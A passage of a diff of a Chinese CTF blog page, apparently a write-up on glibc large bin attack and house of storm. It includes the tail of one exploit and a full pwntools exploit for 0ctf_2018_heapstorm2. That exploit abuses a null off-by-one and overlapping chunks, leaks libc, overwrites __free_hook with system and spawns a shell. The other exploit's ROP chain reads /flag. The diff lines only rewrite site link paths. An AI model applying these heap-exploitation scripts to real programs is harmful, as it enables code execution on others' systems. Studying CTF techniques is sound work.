bin里的大</span></span><br><span class="line"><span class="comment">#将free_hook_addr链接到unsorted bin chunk的bk</span></span><br><span class="line">fake_chunk = free_hook_addr - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>) + p64(fake_chunk))</span><br><span class="line"><span class="comment">#控制large bin的bk_nextsize，目的是解链时向bk_nextsize-&gt;fd_nextsize写入一个堆地址，我们可以以此来伪造size</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(fake_chunk + <span class="number">0x8</span>) <span class="comment">#bk，只需保证是一个可写的地址即可</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk - <span class="number">0x18</span> - <span class="number">0x5</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">##触发house of storm，申请到free_hook处</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#写free_hook，栈迁移到堆里</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;mov     rsp, [rdi+0A0h]</span></span><br><span class="line"><span class="string">...&#x27;&#x27;&#x27;</span></span><br><span class="line">rop = p64(<span class="number">0</span>) + p64(pop_rsi) + p64(free_hook_addr + <span class="number">0x40</span>) + p64(pop_rdx) + p64(<span class="number">0x200</span>) + p64(read_addr)</span><br><span class="line">payload = p64(setcontext_addr + <span class="number">0x35</span>) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += rop</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"><span class="comment">#设置0xA0偏移处的值</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xA0</span> + p64(free_hook_addr + <span class="number">0x10</span>) + p64(pop_rdi))</span><br><span class="line"><span class="comment">#栈迁移到free_hook_addr + 0x10，执行read，继续输入后续rop</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">flag_addr = free_hook_addr + <span class="number">0x40</span> + <span class="number">0x98</span></span><br><span class="line">rop2 = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">rop2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">rop2 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(write_addr)</span><br><span class="line">rop2 += <span class="string">&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.send(rop2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h1><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image16.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image16.png" class="">
 
 <p>然后，我们用IDA分析一下</p>
 <p>存在一个null off by one漏洞，但是prev_size不可控。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image17.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image17.png" class="">
 
 <p>由此，我们可以使用shrink unsorted bin的方法来构造overlap chunk。</p>
 <p>Show功能需要满足条件才能使用</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image18.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image18.png" class="">
 
 <p>因此，我们需要利用house of strom申请到堆指针数组处，也就是0x13370800这个地址处，然后控制其里面的数据，使得我们能够调用show，进而泄露地址，然后通过edit去修改free_hook，从而getshell。</p>
-<img src="/ha1vk/2020/06/11/large_bin_attack_house_of_strom/image19.png" class="">
+<img src="/2020/06/11/large_bin_attack_house_of_strom/image19.png" class="">
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./0ctf_2018_heapstorm2&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node3.buuoj.cn&#x27;,26323)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_s = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_s = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_s = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造chunk 1的尾部</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x3F0</span> + p64(<span class="number">0x400</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="comment">#1放入unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#null off by one shrink unsorted bin</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>-<span class="number">0xC</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">0xC</span>))</span><br><span class="line"><span class="comment">#从unsorted bin里切割</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x360</span>) <span class="comment">#7</span></span><br><span class="line"><span class="comment">#1放入unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#2向前合并</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1 将unsorted bin指针移动到下一个chunk</span></span><br><span class="line"><span class="comment">#将0x420的chunk申请出来，待会儿再放入large bin</span></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#我们用同样的方法来构造一个大一些的large bin</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x3F0</span> + p64(<span class="number">0x400</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"><span class="comment">#4放入unsorted bin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#null off by one shrink unsorted bin</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x18</span>-<span class="number">0xC</span>,<span class="string">&#x27;c&#x27;</span>*(<span class="number">0x18</span>-<span class="number">0xC</span>))</span><br><span class="line"><span class="comment">#从unsorted bin里切割</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x360</span>) <span class="comment">#8</span></span><br><span class="line"><span class="comment">#4放入unsorted bin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#5向前合并</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#将0x430的chunk申请出来，待会儿再放入unsorted bin</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#5</span></span><br><span class="line"><span class="comment">#将2放入large bin，通过7我们可以large bin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#5放入unsorted bin，通过8，我们可以控制一个未归位的large bin</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#我们要分配到的目的地</span></span><br><span class="line">fake_chunk = <span class="number">0x0000000013370800</span> - <span class="number">0x10</span></span><br><span class="line"><span class="comment">#控制unsorted bin相关指针</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(fake_chunk))</span><br><span class="line"><span class="comment">#控制large bin相关指针</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(fake_chunk + <span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(fake_chunk - <span class="number">0x18</span> -<span class="number">0x5</span>))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line"><span class="comment">#通过5，我们可以控制整个堆指针数组了</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x13377331</span>) + p64(<span class="number">0</span>) + p64(fake_chunk + <span class="number">0x40</span>) + p64(<span class="number">0x48</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0x00000000133707F3</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#泄露堆地址</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Chunk[1]: &#x27;</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_addr=&#x27;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line"><span class="comment">#泄露lib指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(heap_addr + <span class="number">0x10</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Chunk[1]: &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">free_hook_addr = libc_base + free_hook_s</span><br><span class="line">system_addr = libc_base + system_s</span><br><span class="line">binsh_addr = libc_base + binsh_s</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(free_hook_addr) + p64(<span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#写free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(binsh_addr) + p64(<span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
     </div>
@@ -366,10 +366,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/house-of-orange/" rel="tag"># house of orange</a>
-              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
-              <a href="/ha1vk/tags/large-bin-attack/" rel="tag"># large bin attack</a>
-              <a href="/ha1vk/tags/house-of-strom/" rel="tag"># house of strom</a>
+              <a href="/tags/house-of-orange/" rel="tag"># house of orange</a>
+              <a href="/tags/IO-FILE/" rel="tag"># IO FILE</a>
+              <a href="/tags/large-bin-attack/" rel="tag"># large bin attack</a>
+              <a href="/tags/house-of-strom/" rel="tag"># house of strom</a>
           </div>
 
         
@@ -378,11 +378,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/06/11/de1ctf_2019_unprintable/" rel="prev" title="de1ctf_2019_unprintable(_dl_fini的l_addr劫持妙用)">
+    <a href="/2020/06/11/de1ctf_2019_unprintable/" rel="prev" title="de1ctf_2019_unprintable(_dl_fini的l_addr劫持妙用)">
       <i class="fa fa-chevron-left"></i> de1ctf_2019_unprintable(_dl_fini的l_addr劫持妙用)
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/01/ACTF_2019_ACTFNOTE/" rel="next" title="ACTF_2019_ACTFNOTE(top chunk上移)">
+    <a href="/2020/07/01/ACTF_2019_ACTFNOTE/" rel="next" title="ACTF_2019_ACTFNOTE(top chunk上移)">
       ACTF_2019_ACTFNOTE(top chunk上移) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -455,20 +455,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -541,30 +541,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
